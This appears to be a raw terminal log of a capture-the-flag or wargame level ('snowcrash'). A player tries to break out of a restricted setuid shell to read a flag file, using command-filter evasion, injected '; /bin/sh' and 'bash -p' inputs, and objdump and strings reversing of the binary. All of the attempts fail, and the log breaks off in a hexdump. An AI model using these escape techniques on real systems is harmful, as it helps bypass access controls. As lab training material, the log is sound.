level00@snowcrash:~$ /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ cat /etc/snowcrash/hiro.conf           
cat: permission denied
flag00@snowcrash:~$ cd /etc/snowcrash
cd /etc/snowcrash: command not found
flag00@snowcrash:~$ ls -la
total 12
drwxr-x--- 2 flag00 flag00 4096 Jan  1 00:00 .
drwxr-xr-x 22 root   root   4096 Jan  1 00:00 ..
-r-------- 1 flag00 flag00   32 Jan  1 00:00 .flag
-rwsr-x--- 1 flag00 level00  12288 Jan  1 00:00 hiro
flag00@snowcrash:~$ cat hiro
cat: permission denied
flag00@snowcrash:~$ getflag
getflag: command not found
flag00@snowcrash:~$ ^C
level00@snowcrash:~$ echo "$(< .flag)"
-bash: .flag: No such file or directory

level00@snowcrash:~$ printf "%s\n" "$(< .flag)"
-bash: .flag: No such file or directory

level00@snowcrash:~$ read FLAG < .flag; echo $FLAG
-bash: .flag: No such file or directory

level00@snowcrash:~$ cat /usr/sbin/john
cat: /usr/sbin/john: No such file or directory
level00@snowcrash:~$ cat /usr/sbin/hiro
cat: /usr/sbin/hiro: No such file or directory
level00@snowcrash:~$ cat README
Hiro Protagonist. Last of the freelance hackers. Or so he thinks.
level00@snowcrash:~$ /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ echo "$(< .flag)"
echo "$(< .flag)": command not found
flag00@snowcrash:~$ printf "%s\n" "$(< .flag)"
printf "%s\n" "$(< .flag)": command not found
flag00@snowcrash:~$ read FLAG < .flag; echo $FLAG
read FLAG < .flag; echo $FLAG: command not found
flag00@snowcrash:~$ while read line; do echo "$line"; done < .flag
while read line; do echo "$line"; done < .flag: command not found
flag00@snowcrash:~$ head .flag
head .flag: command not found
flag00@snowcrash:~$ tail .flag  
tail .flag: command not found
flag00@snowcrash:~$ more .flag
more .flag: command not found
flag00@snowcrash:~$ less .flag
less .flag: command not found
flag00@snowcrash:~$ nl .flag
nl .flag: command not found
flag00@snowcrash:~$ ; /bin/sh
; /bin/sh: command not found
flag00@snowcrash:~$ | /bin/sh
| /bin/sh: command not found
flag00@snowcrash:~$ help
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
Type 'help' to see this list.
flag00@snowcrash:~$ help
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
Type 'help' to see this list.
flag00@snowcrash:~$ builtins
builtins: command not found
flag00@snowcrash:~$ c'a't .flag
c'a't .flag: command not found
flag00@snowcrash:~$ c""at .flag
c""at .flag: command not found

Session timeout.
level00@snowcrash:~$ /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ $SHELL
$SHELL: command not found
flag00@snowcrash:~$ 		
		: command not found
flag00@snowcrash:~$ . .flag
. .flag: command not found
flag00@snowcrash:~$ exit
logout
level00@snowcrash:~$ cat /var/log/snowcrash/hiro.log
cat: /var/log/snowcrash/hiro.log: No such file or directory
level00@snowcrash:~$ ls -la /tmp /var/tmp
/tmp:
total 60
drwxrwxrwt 14 root   root   4096 Sep 25 23:49 .
drwxr-xr-x 23 root   root   4096 Jun  9 19:00 ..
drwxrwxrwt  2 root   root   4096 Sep 26  2026 .font-unix
drwxrwxrwt  2 root   root   4096 Sep 26  2026 .ICE-unix
-rw-r--r--  1 flag02 flag02   27 Sep 26  2026 kourier_delivery.tmp
drwx------  2 root   root   4096 Sep 26  2026 snap-private-tmp
drwx------  3 root   root   4096 Sep 25 22:46 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-fwupd.service-hKVJ5p
drwx------  3 root   root   4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-ModemManager.service-hhxHeJ
drwx------  3 root   root   4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-polkit.service-NOljiE
drwx------  3 root   root   4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-logind.service-3C7qxJ
drwx------  3 root   root   4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-resolved.service-adKDa6
drwx------  3 root   root   4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-timesyncd.service-IcxCzC
drwx------  3 root   root   4096 Sep 25 22:46 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-upower.service-QgNfYI
drwxrwxrwt  2 root   root   4096 Sep 26  2026 .X11-unix
drwxrwxrwt  2 root   root   4096 Sep 26  2026 .XIM-unix

/var/tmp:
total 36
drwxrwxrwt  9 root root 4096 Sep 25 23:45 .
drwxr-xr-x 13 root root 4096 Jun  9 19:02 ..
drwx------  3 root root 4096 Sep 25 22:46 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-fwupd.service-yel3q4
drwx------  3 root root 4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-ModemManager.service-PU6EeX
drwx------  3 root root 4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-polkit.service-K2tcoa
drwx------  3 root root 4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-logind.service-tttBjM
drwx------  3 root root 4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-resolved.service-eLEcdk
drwx------  3 root root 4096 Sep 26  2026 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-timesyncd.service-yY53Ww
drwx------  3 root root 4096 Sep 25 22:46 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-upower.service-jK0nR5
level00@snowcrash:~$ /opt/snowcrash/level00/hiro -c "cat /home/flag00/.flag"
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ exit
logout
level00@snowcrash:~$ /opt/snowcrash/level00/hiro /home/flag00/.flag
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ exit
logout
level00@snowcrash:~$ echo "cat .flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ cat: permission denied
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ echo 'echo "$(< .flag)"' | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ echo "$(< .flag)": command not found
flag00@snowcrash:~$ lecho 'echo "$(< /home/flag00/.flag)"' | /opt/snowcrash/level00/hiroowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ echo "$(< /home/flag00/.flag)": command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ echo "head -n 100 .flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...

[*] Access granted — welcome, flag00
flag00@snowcrash:~$ head -n 100 .flag: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "head -n 100 .flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ head -n 100 .flag: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "tail -n 100 .flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ tail -n 100 .flag: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "grep -E '.*' .flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ grep -E '.*' .flag: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "more .flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ more .flag: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "base64 .flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00

flag00@snowcrash:~$ base64 .flag: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "sh" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ sh: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "bash -p" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ bash -p: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ echo "cat" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ cat: permission denied
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ 
level00@snowcrash:~$ gdb /opt/snowcrash/level00/hiro
Command 'gdb' not found, but can be installed with:
apt install gdb
Please ask your administrator.
level00@snowcrash:~$ /opt/snowcrash/level00/hiro --help
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ /opt/snowcrash/level00/hiro -h    
/opt/snowcrash/level00/hiro -h: command not found
flag00@snowcrash:~$ /opt/snowcrash/level00/hiro algo
/opt/snowcrash/level00/hiro algo: command not found
flag00@snowcrash:~$ objdump -d /opt/snowcrash/level00/hiro | grep -A 30 "<run_restricted_shell>:"
objdump -d /opt/snowcrash/level00/hiro | grep -A 30 "<run_restricted_shell>:": command not found
flag00@snowcrash:~$ echo "grep" | /opt/snowcrash/level00/hiro
echo "grep" | /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ echo "more" | /opt/snowcrash/level00/hiro
echo "more" | /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ echo "awk" | /opt/snowcrash/level00/hiro
echo "awk" | /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ echo "sed" | /opt/snowcrash/level00/hiro
echo "sed" | /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ echo -e "cat\t.flag"
echo -e "cat\t.flag": command not found
flag00@snowcrash:~$ echo "cat:.flag"
echo "cat:.flag": command not found
flag00@snowcrash:~$ echo "cat,.flag"
echo "cat,.flag": command not found
flag00@snowcrash:~$ exit
logout
level00@snowcrash:~$ objdump -d /opt/snowcrash/level00/hiro | grep -A 30 "<run_restricted_shell>:"
0000000000002456 <run_restricted_shell>:
    2456:	f3 0f 1e fa          	endbr64
    245a:	55                   	push   %rbp
    245b:	48 89 e5             	mov    %rsp,%rbp
    245e:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
    2465:	48 89 bd d8 fd ff ff 	mov    %rdi,-0x228(%rbp)
    246c:	48 89 b5 d0 fd ff ff 	mov    %rsi,-0x230(%rbp)
    2473:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    247a:	00 00 
    247c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2480:	31 c0                	xor    %eax,%eax
    2482:	48 8d 05 15 1d 00 00 	lea    0x1d15(%rip),%rax        # 419e <_IO_stdin_used+0x119e>
    2489:	48 89 85 e8 fd ff ff 	mov    %rax,-0x218(%rbp)
    2490:	48 8b 05 89 3b 00 00 	mov    0x3b89(%rip),%rax        # 6020 <stdout@GLIBC_2.2.5>
    2497:	48 89 c1             	mov    %rax,%rcx
    249a:	ba 1c 00 00 00       	mov    $0x1c,%edx
    249f:	be 01 00 00 00       	mov    $0x1,%esi
    24a4:	48 8d 05 08 1d 00 00 	lea    0x1d08(%rip),%rax        # 41b3 <_IO_stdin_used+0x11b3>
    24ab:	48 89 c7             	mov    %rax,%rdi
    24ae:	e8 cd ef ff ff       	call   1480 <fwrite@plt>
    24b3:	bf e0 93 04 00       	mov    $0x493e0,%edi
    24b8:	e8 d3 ef ff ff       	call   1490 <usleep@plt>
    24bd:	48 8b 05 5c 3b 00 00 	mov    0x3b5c(%rip),%rax        # 6020 <stdout@GLIBC_2.2.5>
    24c4:	48 89 c1             	mov    %rax,%rcx
    24c7:	ba 27 00 00 00       	mov    $0x27,%edx
    24cc:	be 01 00 00 00       	mov    $0x1,%esi
    24d1:	48 8d 05 f8 1c 00 00 	lea    0x1cf8(%rip),%rax        # 41d0 <_IO_stdin_used+0x11d0>
    24d8:	48 89 c7             	mov    %rax,%rdi
    24db:	e8 a0 ef ff ff       	call   1480 <fwrite@plt>
    24e0:	bf f0 49 02 00       	mov    $0x249f0,%edi
    24e5:	e8 a6 ef ff ff       	call   1490 <usleep@plt>
level00@snowcrash:~$ echo -e "cat\t.flag" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ cat: permission denied
flag00@snowcrash:~$ lecho "grep . .flag" | /opt/snowcrash/level00/hiroowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ grep . .flag: command not found
flag00@snowcrash:~$ lecho "more" | /opt/snowcrash/level00/hiroowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ more: command not found
flag00@snowcrash:~$ lecho "awk" | /opt/snowcrash/level00/hiroowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ awk: command not found
flag00@snowcrash:~$ lecho "sed" | /opt/snowcrash/level00/hiroowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ sed: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ echo -e "cat\t.flag"
cat	.flag
level00@snowcrash:~$ echo "cat:.flag"
cat:.flag
level00@snowcrash:~$ echo "cat,.flag"
cat,.flag
level00@snowcrash:~$ objdump -d /opt/snowcrash/level00/hiro | grep -A 100 "<run_restricted_shell>:"
0000000000002456 <run_restricted_shell>:
    2456:	f3 0f 1e fa          	endbr64
    245a:	55                   	push   %rbp
    245b:	48 89 e5             	mov    %rsp,%rbp
    245e:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
    2465:	48 89 bd d8 fd ff ff 	mov    %rdi,-0x228(%rbp)
    246c:	48 89 b5 d0 fd ff ff 	mov    %rsi,-0x230(%rbp)
    2473:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    247a:	00 00 
    247c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2480:	31 c0                	xor    %eax,%eax
    2482:	48 8d 05 15 1d 00 00 	lea    0x1d15(%rip),%rax        # 419e <_IO_stdin_used+0x119e>
    2489:	48 89 85 e8 fd ff ff 	mov    %rax,-0x218(%rbp)
    2490:	48 8b 05 89 3b 00 00 	mov    0x3b89(%rip),%rax        # 6020 <stdout@GLIBC_2.2.5>
    2497:	48 89 c1             	mov    %rax,%rcx
    249a:	ba 1c 00 00 00       	mov    $0x1c,%edx
    249f:	be 01 00 00 00       	mov    $0x1,%esi
    24a4:	48 8d 05 08 1d 00 00 	lea    0x1d08(%rip),%rax        # 41b3 <_IO_stdin_used+0x11b3>
    24ab:	48 89 c7             	mov    %rax,%rdi
    24ae:	e8 cd ef ff ff       	call   1480 <fwrite@plt>
    24b3:	bf e0 93 04 00       	mov    $0x493e0,%edi
    24b8:	e8 d3 ef ff ff       	call   1490 <usleep@plt>
    24bd:	48 8b 05 5c 3b 00 00 	mov    0x3b5c(%rip),%rax        # 6020 <stdout@GLIBC_2.2.5>
    24c4:	48 89 c1             	mov    %rax,%rcx
    24c7:	ba 27 00 00 00       	mov    $0x27,%edx
    24cc:	be 01 00 00 00       	mov    $0x1,%esi
    24d1:	48 8d 05 f8 1c 00 00 	lea    0x1cf8(%rip),%rax        # 41d0 <_IO_stdin_used+0x11d0>
    24d8:	48 89 c7             	mov    %rax,%rdi
    24db:	e8 a0 ef ff ff       	call   1480 <fwrite@plt>
    24e0:	bf f0 49 02 00       	mov    $0x249f0,%edi
    24e5:	e8 a6 ef ff ff       	call   1490 <usleep@plt>
    24ea:	c7 85 e4 fd ff ff 01 	movl   $0x1,-0x21c(%rbp)
    24f1:	00 00 00 
    24f4:	e9 b6 04 00 00       	jmp    29af <run_restricted_shell+0x559>
    24f9:	48 8b 95 d0 fd ff ff 	mov    -0x230(%rbp),%rdx
    2500:	48 8b 85 d8 fd ff ff 	mov    -0x228(%rbp),%rax
    2507:	48 89 d6             	mov    %rdx,%rsi
    250a:	48 89 c7             	mov    %rax,%rdi
    250d:	e8 99 f9 ff ff       	call   1eab <check_session_timeout>
    2512:	85 c0                	test   %eax,%eax
    2514:	79 53                	jns    2569 <run_restricted_shell+0x113>
    2516:	48 8b 05 03 3b 00 00 	mov    0x3b03(%rip),%rax        # 6020 <stdout@GLIBC_2.2.5>
    251d:	48 89 c1             	mov    %rax,%rcx
    2520:	ba 12 00 00 00       	mov    $0x12,%edx
    2525:	be 01 00 00 00       	mov    $0x1,%esi
    252a:	48 8d 05 c7 1c 00 00 	lea    0x1cc7(%rip),%rax        # 41f8 <_IO_stdin_used+0x11f8>
    2531:	48 89 c7             	mov    %rax,%rdi
    2534:	e8 47 ef ff ff       	call   1480 <fwrite@plt>
    2539:	48 8b 85 d8 fd ff ff 	mov    -0x228(%rbp),%rax
    2540:	48 8d 15 bd 1b 00 00 	lea    0x1bbd(%rip),%rdx        # 4104 <_IO_stdin_used+0x1104>
    2547:	48 89 d6             	mov    %rdx,%rsi
    254a:	48 89 c7             	mov    %rax,%rdi
    254d:	e8 08 f2 ff ff       	call   175a <audit_event>
    2552:	48 8b 05 37 42 00 00 	mov    0x4237(%rip),%rax        # 6790 <g_metrics+0x10>
    2559:	48 83 c0 01          	add    $0x1,%rax
    255d:	48 89 05 2c 42 00 00 	mov    %rax,0x422c(%rip)        # 6790 <g_metrics+0x10>
    2564:	e9 60 04 00 00       	jmp    29c9 <run_restricted_shell+0x573>
    2569:	48 8b 15 b0 3a 00 00 	mov    0x3ab0(%rip),%rdx        # 6020 <stdout@GLIBC_2.2.5>
    2570:	48 8b 85 e8 fd ff ff 	mov    -0x218(%rbp),%rax
    2577:	48 89 d6             	mov    %rdx,%rsi
    257a:	48 89 c7             	mov    %rax,%rdi
    257d:	e8 ae ed ff ff       	call   1330 <fputs@plt>
    2582:	48 8b 05 97 3a 00 00 	mov    0x3a97(%rip),%rax        # 6020 <stdout@GLIBC_2.2.5>
    2589:	48 89 c7             	mov    %rax,%rdi
    258c:	e8 5f ee ff ff       	call   13f0 <fflush@plt>
    2591:	48 8b 15 98 3a 00 00 	mov    0x3a98(%rip),%rdx        # 6030 <stdin@GLIBC_2.2.5>
    2598:	48 8d 85 f0 fd ff ff 	lea    -0x210(%rbp),%rax
    259f:	be 00 02 00 00       	mov    $0x200,%esi
    25a4:	48 89 c7             	mov    %rax,%rdi
    25a7:	e8 e4 ed ff ff       	call   1390 <fgets@plt>
    25ac:	48 85 c0             	test   %rax,%rax
    25af:	0f 84 13 04 00 00    	je     29c8 <run_restricted_shell+0x572>
    25b5:	48 8d 85 f0 fd ff ff 	lea    -0x210(%rbp),%rax
    25bc:	48 8d 15 48 1c 00 00 	lea    0x1c48(%rip),%rdx        # 420b <_IO_stdin_used+0x120b>
    25c3:	48 89 d6             	mov    %rdx,%rsi
    25c6:	48 89 c7             	mov    %rax,%rdi
    25c9:	e8 b2 ed ff ff       	call   1380 <strcspn@plt>
    25ce:	c6 84 05 f0 fd ff ff 	movb   $0x0,-0x210(%rbp,%rax,1)
    25d5:	00 
    25d6:	bf 00 00 00 00       	mov    $0x0,%edi
    25db:	e8 f0 ed ff ff       	call   13d0 <time@plt>
    25e0:	48 8b 95 d8 fd ff ff 	mov    -0x228(%rbp),%rdx
    25e7:	48 89 42 20          	mov    %rax,0x20(%rdx)
    25eb:	e8 76 fb ff ff       	call   2166 <metrics_record_command>
    25f0:	48 8d 85 f0 fd ff ff 	lea    -0x210(%rbp),%rax
    25f7:	48 8d 15 0f 1c 00 00 	lea    0x1c0f(%rip),%rdx        # 420d <_IO_stdin_used+0x120d>
    25fe:	48 89 d6             	mov    %rdx,%rsi
    2601:	48 89 c7             	mov    %rax,%rdi
    2604:	e8 97 ed ff ff       	call   13a0 <strcmp@plt>
    2609:	85 c0                	test   %eax,%eax
    260b:	75 14                	jne    2621 <run_restricted_shell+0x1cb>
    260d:	48 8d 05 fc 1b 00 00 	lea    0x1bfc(%rip),%rax        # 4210 <_IO_stdin_used+0x1210>
    2614:	48 89 c7             	mov    %rax,%rdi
    2617:	e8 84 ec ff ff       	call   12a0 <puts@plt>
    261c:	e9 8e 03 00 00       	jmp    29af <run_restricted_shell+0x559>
    2621:	48 8d 85 f0 fd ff ff 	lea    -0x210(%rbp),%rax
    2628:	48 8d 15 17 1c 00 00 	lea    0x1c17(%rip),%rdx        # 4246 <_IO_stdin_used+0x1246>
    262f:	48 89 d6             	mov    %rdx,%rsi
    2632:	48 89 c7             	mov    %rax,%rdi
    2635:	e8 66 ed ff ff       	call   13a0 <strcmp@plt>
    263a:	85 c0                	test   %eax,%eax
level00@snowcrash:~$ strings -a -t x /opt/snowcrash/level00/hiro | grep -A 30 "420d"
level00@snowcrash:~$ strings /opt/snowcrash/level00/hiro | grep -E '^[a-z0-9_-]{2,15}$'
fgets
snprintf
stdin
strncpy
exit
fflush
difftime
fopen
getpwuid
getgrnam
usleep
getpid
stdout
strftime
atoi
strcspn
stderr
ctermid
fprintf
__cxa_finalize
localtime
getgid
fclose
memset
fputc
fputs
__isoc99_sscanf
getuid
getegid
fwrite
strcmp
strncmp
geteuid
__gmon_start__
flag00
version
max_retries
session_timeout
rate_limit
audit_enabled
log_path
whoami
flag00
hostname
uname
sudo
exit
quit
logout
help
denied_group
session_start
session_end
__abi_tag
frame_dummy
flag_data
g_shutdown_flag
g_audit_seq
g_audit_fd
g_retry_count
g_session_pid
g_policy_level
g_rate_table
g_cred_cache
handle_sigterm
open_audit
audit_event
close_audit
uid_hash
rate_check
check_terminal
g_metrics
metrics_emit
init_context
fatal
_edata
_fini
__data_start
__gmon_start__
__dso_handle
_end
__bss_start
main
_init
level00@snowcrash:~$ /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ echo "flag00" | /opt/snowcrash/level00/hiro
echo "flag00" | /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ echo "uname -a" | /opt/snowcrash/level00/hiro
echo "uname -a" | /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ objdump -s -j .rodata /opt/snowcrash/level00/hiro
objdump -s -j .rodata /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ objdump -s -j .data /opt/snowcrash/level00/hiro
objdump -s -j .data /opt/snowcrash/level00/hiro: command not found
flag00@snowcrash:~$ exit
logout
level00@snowcrash:~$ echo "flag00" | /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ flag00: command not found
flag00@snowcrash:~$ level00@snowcrash:~$ 
level00@snowcrash:~$ objdump -s -j .rodata /opt/snowcrash/level00/hiro

/opt/snowcrash/level00/hiro:     file format elf64-x86-64

Contents of section .rodata:
 3000 01000200 00000000 00000000 00000000  ................
 3010 00000000 00000000 00000000 00000000  ................
 3020 25592d25 6d2d2564 5425483a 254d3a25  %Y-%m-%dT%H:%M:%
 3030 53000000 00000000 25732073 65713d25  S.......%s seq=%
 3040 75207569 643d2564 20657569 643d2564  u uid=%d euid=%d
 3050 20676964 3d256420 75736572 3d257320   gid=%d user=%s 
 3060 7465726d 3d257320 72657472 6965733d  term=%s retries=
 3070 25642065 76656e74 3d25730a 00000000  %d event=%s.....
 3080 03000000 05000000 2c010000 3c000000  ........,...<...
 3090 78000000 01000000 01000000 00000000  x...............
 30a0 666c6167 30300000 00000000 00000000  flag00..........
 30b0 00000000 00000000 00000000 00000000  ................
 30c0 00000000 00000000 00000000 00000000  ................
 30d0 00000000 00000000 00000000 00000000  ................
 30e0 2f766172 2f6c6f67 2f736e6f 77637261  /var/log/snowcra
 30f0 73682f68 69726f2e 6c6f6700 00000000  sh/hiro.log.....
 3100 00000000 00000000 00000000 00000000  ................
 3110 00000000 00000000 00000000 00000000  ................
 3120 00000000 00000000 00000000 00000000  ................
 3130 00000000 00000000 00000000 00000000  ................
 3140 00000000 00000000 00000000 00000000  ................
 3150 00000000 00000000 00000000 00000000  ................
 3160 00000000 00000000 00000000 00000000  ................
 3170 00000000 00000000 00000000 00000000  ................
 3180 00000000 00000000 00000000 00000000  ................
 3190 00000000 00000000 00000000 00000000  ................
 31a0 00000000 00000000 00000000 00000000  ................
 31b0 00000000 00000000 00000000 00000000  ................
 31c0 00000000 00000000 00000000 00000000  ................
 31d0 00000000 00000000 00000000 00000000  ................
 31e0 00000000 00000000 00000000 00000000  ................
 31f0 00000000 00000000 00000000 00000000  ................
 3200 00000000 00000000 00000000 00000000  ................
 3210 00000000 00000000 00000000 00000000  ................
 3220 00000000 00000000 00000000 00000000  ................
 3230 00000000 00000000 00000000 00000000  ................
 3240 00000000 00000000 00000000 00000000  ................
 3250 00000000 00000000 00000000 00000000  ................
 3260 00000000 00000000 00000000 00000000  ................
 3270 00000000 00000000 00000000 00000000  ................
 3280 00000000 00000000 00000000 00000000  ................
 3290 00000000 00000000 00000000 00000000  ................
 32a0 00000000 00000000 00000000 00000000  ................
 32b0 00000000 00000000 00000000 00000000  ................
 32c0 00000000 00000000 00000000 00000000  ................
 32d0 00000000 00000000 00000000 00000000  ................
 32e0 00000000 00000000 00000000 00000000  ................
 32f0 00000000 00000000 00000000 00000000  ................
 3300 00000000 00000000 00000000 00000000  ................
 3310 00000000 00000000 00000000 00000000  ................
 3320 00000000 00000000 00000000 00000000  ................
 3330 00000000 00000000 00000000 00000000  ................
 3340 00000000 00000000 00000000 00000000  ................
 3350 00000000 00000000 00000000 00000000  ................
 3360 00000000 00000000 00000000 00000000  ................
 3370 00000000 00000000 00000000 00000000  ................
 3380 00000000 00000000 00000000 00000000  ................
 3390 00000000 00000000 00000000 00000000  ................
 33a0 00000000 00000000 00000000 00000000  ................
 33b0 00000000 00000000 00000000 00000000  ................
 33c0 00000000 00000000 00000000 00000000  ................
 33d0 00000000 00000000 00000000 00000000  ................
 33e0 00000000 00000000 00000000 00000000  ................
 33f0 00000000 00000000 00000000 00000000  ................
 3400 00000000 00000000 00000000 00000000  ................
 3410 00000000 00000000 00000000 00000000  ................
 3420 00000000 00000000 00000000 00000000  ................
 3430 00000000 00000000 00000000 00000000  ................
 3440 00000000 00000000 00000000 00000000  ................
 3450 00000000 00000000 00000000 00000000  ................
 3460 00000000 00000000 00000000 00000000  ................
 3470 00000000 00000000 00000000 00000000  ................
 3480 00000000 00000000 00000000 00000000  ................
 3490 00000000 00000000 00000000 00000000  ................
 34a0 00000000 00000000 00000000 00000000  ................
 34b0 00000000 00000000 00000000 00000000  ................
 34c0 00000000 00000000 00000000 00000000  ................
 34d0 00000000 00000000 00000000 00000000  ................
 34e0 00000000 00000000 00000000 00000000  ................
 34f0 00000000 00000000 00000000 00000000  ................
 3500 00000000 00000000 00000000 00000000  ................
 3510 00000000 00000000 00000000 00000000  ................
 3520 00000000 00000000 00000000 00000000  ................
 3530 00000000 00000000 00000000 00000000  ................
 3540 00000000 00000000 00000000 00000000  ................
 3550 00000000 00000000 00000000 00000000  ................
 3560 00000000 00000000 00000000 00000000  ................
 3570 00000000 00000000 00000000 00000000  ................
 3580 00000000 00000000 00000000 00000000  ................
 3590 00000000 00000000 00000000 00000000  ................
 35a0 00000000 00000000 00000000 00000000  ................
 35b0 00000000 00000000 00000000 00000000  ................
 35c0 00000000 00000000 00000000 00000000  ................
 35d0 00000000 00000000 00000000 00000000  ................
 35e0 00000000 00000000 00000000 00000000  ................
 35f0 00000000 00000000 00000000 00000000  ................
 3600 00000000 00000000 00000000 00000000  ................
 3610 00000000 00000000 00000000 00000000  ................
 3620 00000000 00000000 00000000 00000000  ................
 3630 00000000 00000000 00000000 00000000  ................
 3640 00000000 00000000 00000000 00000000  ................
 3650 00000000 00000000 00000000 00000000  ................
 3660 00000000 00000000 00000000 00000000  ................
 3670 00000000 00000000 00000000 00000000  ................
 3680 00000000 00000000 00000000 00000000  ................
 3690 00000000 00000000 00000000 00000000  ................
 36a0 00000000 00000000 00000000 00000000  ................
 36b0 00000000 00000000 00000000 00000000  ................
 36c0 00000000 00000000 00000000 00000000  ................
 36d0 00000000 00000000 00000000 00000000  ................
 36e0 00000000 00000000 00000000 00000000  ................
 36f0 00000000 00000000 00000000 00000000  ................
 3700 00000000 00000000 00000000 00000000  ................
 3710 00000000 00000000 00000000 00000000  ................
 3720 00000000 00000000 00000000 00000000  ................
 3730 00000000 00000000 00000000 00000000  ................
 3740 00000000 00000000 00000000 00000000  ................
 3750 00000000 00000000 00000000 00000000  ................
 3760 00000000 00000000 00000000 00000000  ................
 3770 00000000 00000000 00000000 00000000  ................
 3780 00000000 00000000 00000000 00000000  ................
 3790 00000000 00000000 00000000 00000000  ................
 37a0 00000000 00000000 00000000 00000000  ................
